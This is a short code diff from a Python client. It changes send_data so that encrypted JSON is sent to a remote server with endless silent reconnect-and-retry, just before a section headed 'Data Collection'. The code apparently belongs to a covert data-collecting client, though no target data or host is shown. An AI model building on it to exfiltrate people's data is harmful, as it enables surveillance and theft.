@@ -70,17 +70,21 @@ connect_to_server()
 
 def send_data(data):
     global fernet, client_socket
-    if not fernet or not client_socket:
-        connect_to_server() # Reconnect if not connected
-        return
-
-    try:
-        encrypted_data = fernet.encrypt(json.dumps(data).encode('utf-8'))
-        client_socket.sendall(encrypted_data + b'\n')
-    except (ConnectionResetError, BrokenPipeError, OSError):
-        connect_to_server()
-    except Exception as e:
-        pass
+    while True:
+        try:
+            if not fernet or not client_socket:
+                connect_to_server()
+            
+            encrypted_data = fernet.encrypt(json.dumps(data).encode('utf-8'))
+            client_socket.sendall(encrypted_data + b'\n')
+            # print(f"[+] Sent data of type: {data.get('type')}") # for debugging
+            break # Data sent successfully
+        except (ConnectionResetError, BrokenPipeError, OSError) as e:
+            # print(f"[!] Connection error in send_data: {e}. Reconnecting...")
+            connect_to_server()
+        except Exception as e:
+            # print(f"[!] An unexpected error occurred in send_data: {e}")
+            time.sleep(5)
 
 # --- Data Collection ---
 
